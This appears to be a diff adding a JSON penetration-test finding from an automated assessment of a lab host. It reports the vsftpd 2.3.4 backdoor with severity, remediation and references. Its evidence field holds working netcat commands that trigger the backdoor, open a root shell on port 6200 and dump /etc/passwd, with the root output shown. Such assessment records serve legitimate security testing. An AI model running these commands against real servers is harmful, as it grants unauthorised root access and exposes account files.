@@ -1,0 +1,28 @@
+{
+  "finding_id": "finding_002",
+  "title": "Root Shell via vsftpd 2.3.4 Backdoor (CVE-2011-2523)",
+  "severity": "critical",
+  "description": "vsftpd 2.3.4 contains a backdoor that opens a root shell on port 6200 when a username ending with ':)' is used during FTP login. This is a known supply-chain compromise of the vsftpd source code. Successful exploitation provides uid=0(root) access.",
+  "affected_hosts": [
+    "192.168.0.140"
+  ],
+  "evidence": "Exploitation steps:\\n1. Trigger backdoor: (echo 'USER backdoored:)'; sleep 2; echo 'PASS anything'; sleep 3) | nc -w 5 192.168.0.140 21\\n2. Connect to backdoor shell: echo 'id && whoami && cat /etc/passwd' | nc -w 5 192.168.0.140 6200\\n\\nOutput:\\nuid=0(root) gid=0(root)\\nroot\\nmetasploitable\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\\n[...full /etc/passwd dumped with 35+ accounts...]",
+  "cvss_score": 10.0,
+  "remediation": "Immediately upgrade vsftpd to a version not affected by the backdoor (2.3.5+). Verify the integrity of all installed software packages. Consider replacing with a secure FTP alternative or using SFTP.",
+  "references": [
+    "CVE-2011-2523",
+    "https://www.exploit-db.com/exploits/17491",
+    "https://www.exploit-db.com/exploits/49757"
+  ],
+  "exploitable": true,
+  "exploitation_status": "CONFIRMED",
+  "discovered_at": "2026-03-01T18:20:45.977566",
+  "assessment_id": "test5",
+  "evidence_validation": {
+    "quality": "good",
+    "score": 50,
+    "issues": [],
+    "suggestions": [],
+    "has_exploitation_proof": true
+  }
+}
